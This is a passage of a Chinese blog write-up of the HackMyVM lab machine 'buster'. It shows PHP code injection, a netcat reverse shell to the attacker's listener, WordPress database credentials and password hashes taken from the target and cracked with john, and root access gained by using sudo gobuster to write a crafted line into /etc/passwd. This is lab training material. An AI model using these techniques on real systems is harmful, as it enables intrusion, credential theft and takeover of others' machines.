tent-Type: application/json\nContent-Length: 45\nOrigin: http://kubernetes.docker.internal\nConnection: keep-alive\nPriority: u=0\n\n{\u003cspan class=\"hljs-string\"\u003e\"queryArgs\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"phpinfo();\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"queryType\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"post\"\u003c/span\u003e}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMbuster/image78.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是打算执行系统命令时发现执行不了，\u003ccode\u003esystem\u003c/code\u003e和\u003ccode\u003eexec\u003c/code\u003e都使用不了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMbuster/image79.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可能是一些函数被禁用了，搜索一下**\u003ccode\u003e*disable_functions\u003c/code\u003e ,***一看好家伙禁得还不少，但是\u003ccode\u003eshell_exec\u003c/code\u003e还没禁用\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMbuster/image80.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是执行命令没有回显\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMbuster/image81.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eping\u003c/code\u003e是可以成功接收到的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e┌──(root㉿kali)-[~]                                                                                                                                          \n└─# tcpdump icmp -i eth1                                                                                                                                     \ntcpdump: verbose output suppressed, use -v[v]... \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e full protocol decode                                                                                    \nlistening on eth1, link-type EN10MB (Ethernet), snapshot length 262144 bytes                                                                                 \n07:45:12.562498 IP 192.168.56.24 \u003e 192.168.56.4: ICMP \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e request, \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e 1669, \u003cspan class=\"hljs-built_in\"\u003eseq\u003c/span\u003e 63, length 64\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试反弹\u003ccode\u003eshell\u003c/code\u003e ，因为闭合问题不能使用\u003ccode\u003e/bin/bash\u003c/code\u003e弹，使用\u003ccode\u003enc\u003c/code\u003e也成功了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMbuster/image82.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e┌──(root㉿kali)-[~]\n└─# nc -lvp 4444\nlistening on [any] 4444 ...\n192.168.56.24: inverse host lookup failed: Host name lookup failure\nconnect to [192.168.56.4] from (UNKNOWN) [192.168.56.24] 59298\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e靶机信息搜集\u003c/h2\u003e\n\u003cp\u003e存在\u003ccode\u003epython\u003c/code\u003e ，先获得好点的\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epython -c \u003cspan class=\"hljs-string\"\u003e\"import pty;pty.spawn('/bin/sh')\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e在\u003ccode\u003ewp-config.php\u003c/code\u003e里面发现数据库账号密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/** Database username */                                                                                                                                     \ndefine( \u003cspan class=\"hljs-string\"\u003e'DB_USER'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'll104567'\u003c/span\u003e );                                                                                                                             \n                                                                                                                                                             \n/** Database password */                                                      \ndefine( \u003cspan class=\"hljs-string\"\u003e'DB_PASSWORD'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'thehandsomeguy'\u003c/span\u003e );\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查询\u003ccode\u003ewp_users\u003c/code\u003e数据库\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eMariaDB [wordpress]\u003e \u003cspan class=\"hljs-keyword\"\u003eselect\u003c/span\u003e * from wp_users;\n\u003cspan class=\"hljs-keyword\"\u003eselect\u003c/span\u003e * from wp_users;\n+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+\n| ID | user_login | user_pass                          | user_nicename | user_email        | user_url              | user_registered     | user_activation_key                           | user_status | display_name |\n+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+\n|  1 | ta0        | $P\u003cspan class=\"hljs-variable\"\u003e$BDDc71nM67DbOVN\u003c/span\u003e/U50WFGII6EF6.r. | ta0           | 2814928906@qq.com | http://192.168.31.181 | 2025-01-08 03:10:43 |                                               |           0 | ta0          |\n|  2 | welcome    | $P\u003cspan class=\"hljs-variable\"\u003e$BtP9ZghJTwDfSn1gKKc\u003c/span\u003e.k3mq4Vo.Ko/ | welcome       | 127.0.0.1@qq.com  |                       | 2025-01-08 04:29:28 | 1736310568:$P\u003cspan class=\"hljs-variable\"\u003e$B2YbhlDVF1XWIurbL11Pfoasb\u003c/span\u003e./0tD. |           0 | welcome      |\n+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将密码保存为\u003ccode\u003epass\u003c/code\u003e，如何使用\u003ccode\u003ejohn\u003c/code\u003e来破解，爆破出来了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e┌──(root㉿kali)-[~/Desktop/test/buster]\n└─# john --wordlist=/usr/share/wordlists/rockyou.txt pass \nUsing default input encoding: UTF-8\nLoaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])\nCost 1 (iteration count) is 8192 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e all loaded hashes\nWill run 8 OpenMP threads\nPress \u003cspan class=\"hljs-string\"\u003e'q'\u003c/span\u003e or Ctrl-C to abort, almost any other key \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e status\n104567           (?)     \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试\u003ccode\u003essh\u003c/code\u003e登陆成功\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e┌──(root㉿kali)-[~]\n└─# ssh welcome@192.168.56.24 -t bash\nwelcome@192.168.56.24\u003cspan class=\"hljs-string\"\u003e's password: \nwelcome@listen:~$ ls\nuser.txt\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e进去后可以在当前目录找到\u003ccode\u003eUserFlag\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt\n29e0f786e8c90b3ce82e00de0ec7e7d3\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003cp\u003e查看权限，可以以\u003ccode\u003eroot\u003c/code\u003e身份执行\u003ccode\u003egobuster\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewelcome@listen:/$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e welcome on listen:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser welcome may run the following commands on listen:\n    (ALL) NOPASSWD: /usr/bin/gobuster\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看其权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewelcome@listen:/$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al /usr/bin/gobuster\n-rwxr-xr-x 1 root root 4953296 Jun 13  2023 /usr/bin/gobuster\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e到这里就不懂了（雾），看了\u003ccode\u003ewriteup\u003c/code\u003e后发现可以利用\u003ccode\u003egobuster\u003c/code\u003e中的结果输出到指定文件即可\u003c/p\u003e\n\u003cp\u003e先看参数解释\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewelcome@listen:/tmp$ gobuster -h                                                                                                                             \nUsage of gobuster:\n  -P string                                                                   \n        Password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e Basic Auth (\u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e mode only)\n  -U string                                                                   \n        Username \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e Basic Auth (\u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e mode only)\n  -a string                     \n        Set the User-Agent string (\u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e mode only)\n  -c string\n        Cookies to use \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e the requests (\u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e mode only)\n  -cn      \n        Show CNAME records (dns mode only, cannot be used with \u003cspan class=\"hljs-string\"\u003e'-i'\u003c/span\u003e option)\n  -e    Expanded mode, \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e full URLs\n  -f    Append a forward-slash to each directory request (\u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e mode only)      \n  -fw                                                                         \n        Force continued operation when wildcard found\n  -i    Show IP addresses (dns mode only)            \n  -k    Skip SSL certificate verification                                     \n  -l    Include the length of the body \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the output (\u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e mode only)\n  -m string          \n        Directory/File mode (\u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e) or DNS mode (dns) (default \u003cspan class=\"hljs-string\"\u003e\"dir\"\u003c/span\u003e)           \n  -n    Don\u003cspan class=\"hljs-string\"\u003e't print status codes                                              \n  -np                 \n        Don'\u003c/span\u003et display progress                                                \n  -o string                          \n        Output file to write results to (defaults to stdout)\n  -p string                                                                   \n        Proxy to use \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e requests [http(s)://host:port] (\u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e mode only)       \n  -q    Don\u003cspan class=\"hljs-string\"\u003e't print the banner and other noise       \n  -r    Follow redirects      \n  -s string                                                                   \n        Positive status codes (dir mode only) (default \"200,204,301,302,307,403\")                                                                            \n  -t int          \n        Number of concurrent threads (default 10)                             \n  -to duration                                                                \n        HTTP Timeout in seconds (dir mode only) (default 10s)                 \n  -u string                                                                   \n        The target URL or Domain\n  -v    Verbose output (errors)                                               \n  -w string\n        Path to the wordlist                                                  \n  -x string\n        File extension(s) to search for (dir mode only)                                   \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e例如：我们先创建字典文件\u003ccode\u003ewordlist\u003c/code\u003e ，里面写入\u003ccode\u003ehello\u003c/code\u003e 。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewelcome@listen:/tmp$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e wordlist \nhello\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e在\u003ccode\u003ekali\u003c/code\u003e创建\u003ccode\u003ehello\u003c/code\u003e文件，并创建简易web服务器\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e┌──(root㉿kali)-[~/Desktop/test/buster]\n└─# \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\nhello\n\n┌──(root㉿kali)-[~/Desktop/test/buster]\n└─# php -S 0:81\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过\u003ccode\u003egobuster\u003c/code\u003e扫描\u003ccode\u003ekali\u003c/code\u003e 将输出结果放入到\u003ccode\u003etest\u003c/code\u003e文件\u003c/p\u003e\n\u003cp\u003e这样就可以将文字输入带文字了，假如我们将其输入到\u003ccode\u003e/etc/passwd\u003c/code\u003e文件呢？\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewelcome@listen:/tmp$ gobuster -u http://192.168.56.4:81/ -w wordlist -n -q -o \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e\n/hello\nwelcome@listen:/tmp$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e\n/hello\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们打算计划向\u003ccode\u003e/etc/passwd\u003c/code\u003e写入\u003ccode\u003ehack:zSZ7Whrr8hgwY:0:0::/root/:/bin/bash\u003c/code\u003e （长度为\u003ccode\u003e40\u003c/code\u003e） 但是因为会触发交换文件。\u003c/p\u003e\n\u003cp\u003e所以打算创建\u003ccode\u003eweb\u003c/code\u003e服务器，将接收到路径长度\u003ccode\u003e≠40\u003c/code\u003e的数据包都返回\u003ccode\u003e200\u003c/code\u003e ，那么就会输出中写出来\u003c/p\u003e\n\u003cp\u003e(代码参照：\u003ca href=\"https://7r1umph.github.io/post/hmv_buster.html#4.%E6%8F%90%E6%9D%83\"\u003ehttps://7r1umph.github.io/post/hmv_buster.html#4.%E6%8F%90%E6%9D%83\u003c/a\u003e)\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efrom flask import Flask, Response\n\napp = Flask(__name__)\n\n@app.route(\u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e, defaults={\u003cspan class=\"hljs-string\"\u003e'path'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e})\n\u003cspan class=\"hljs-comment\"\u003e# 接收所有路径\u003c/span\u003e\n@app.route(\u003cspan class=\"hljs-string\"\u003e'/\u0026#x3C;path:path\u003e'\u003c/span\u003e)\n\u003cspan class=\"hljs-comment\"\u003e# catch_all 处理所有请求\u003c/span\u003e\ndef catch_all(path):\n\t\t\u003cspan class=\"hljs-comment\"\u003e# 参数path是从url中提取的路径\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e len(path) == 1:\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e Response(status=404)\n    \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e Response(status=200)\n\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e __name__ == \u003cspan class=\"hljs-string\"\u003e'__main__'\u003c/span\u003e:\n    app.run(host=\u003cspan class=\"hljs-string\"\u003e\"0.0.0.0\"\u003c/span\u003e, port=81) \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e启动服务器\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e┌──(root㉿kali)-[~/Desktop/test/buster]\n└─# python3 a.py\n * Serving Flask app \u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e\n * Debug mode: off\nWARNING: This is a development server. Do not use it \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e a production deployment. Use a production WSGI server instead.\n * Running on all addresses (0.0.0.0)\n * Running on http://127.0.0.1:81\nPress CTRL+C to quit\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e靶机在字典中写入\u003ccode\u003ehack:zSZ7Whrr8hgwY:0:0::/root/:/bin/bash\u003c/code\u003e ，并使用\u003ccode\u003egobuster\u003c/code\u003e将其写入\u003ccode\u003e/etc/passwd\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewelcome@listen:/tmp$ \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"hack:zSZ7Whrr8hgwY:0:0::/root/:/bin/bash\"\u003c/span\u003e \u003e wordlist\nwelcome@listen:/tmp$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /usr/bin/gobuster -w wordlist -u http://192.168.56.4:81/ -n -q -fw -o /etc/passwd                                                  \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e切换到到\u003ccode\u003e/hack\u003c/code\u003e用户，密码\u003ccode\u003e123456\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/hack@listen:/tmp# \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=0(/hack) gid=0(root) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=0(root)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e读取\u003ccode\u003eRootFlag\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/hack@listen:/root# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e R00t_fl4g_is_HHHHerererererrererere.txt \nb6a1a0de4223ba038327fc9c647701fb\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e更加熟练对\u003ccode\u003ewpscan\u003c/code\u003e的使用，以及学到如何使用\u003ccode\u003egobuster\u003c/code\u003e提权，如何使用\u003ccode\u003eflask\u003c/code\u003e搭建简易服务器\u003c/p\u003e","title":"HackMyVM - buster","date":"2025-02-20","updated":"2025-02-20","comments":true,"tags":["Linux靶机","HackMyVM"],"categories":"靶机","de
